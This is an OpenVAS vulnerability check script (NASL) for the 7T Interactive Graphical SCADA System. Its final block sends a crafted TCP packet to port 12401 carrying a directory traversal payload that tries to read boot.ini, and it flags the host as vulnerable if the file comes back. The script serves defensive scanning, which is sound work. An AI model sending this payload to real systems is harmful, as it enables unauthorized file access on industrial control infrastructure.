###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_igss_46936.nasl 13 2013-10-27 12:16:33Z jan $
#
# 7T Interactive Graphical SCADA System Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Update By:
# Veerendra G.G <veerendragg@secpod.com> on 2011-05-18
# Updated CVE and Reference section with exploit-db id.
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "7T Interactive Graphical SCADA System is prone to multiple security
vulnerabilities.

Exploiting these issues may allow remote attackers to execute
arbitrary code within the context of the affected application or
perform unauthorized actions using directory traversal strings.";


if (description)
{
 script_id(103128);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2011-1565", "CVE-2011-1567");
 script_bugtraq_id(46936);

 script_name("7T Interactive Graphical SCADA System Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46936");
 script_xref(name : "URL" , value : "http://www.igss.com/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/517080");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17300/");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17024/");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_1-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_2-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_3-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_4-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_5-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_6-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_7-adv.txt");
 script_xref(name : "URL" , value : "http://aluigi.org/adv/igss_8-adv.txt");

 script_tag(name:"risk_factor", value:"Critical");
 script_description(desc);
 script_summary("Determine if installed 7T Interactive Graphical SCADA System is vulnerable");
 script_category(ACT_ATTACK);
 script_family("General");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports(12401);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

port = 12401;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

ex = raw_string(0x9b,0x00,0x01,0x00,0x34,0x12,0x0d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
                0x00,0x00,0x03,0x00,0x00,0x00);

ex += crap(data:raw_string(0x2e,0x2e,0x5c), length:48);
ex += string("boot.ini");
ex += crap(data:raw_string(0x00), length:77);

send(socket:soc, data: ex);
recv = recv(socket:soc,length:8072);

if("[boot loader]" >< recv) {
  security_hole(port:port);
  exit(0);
}

exit(0);
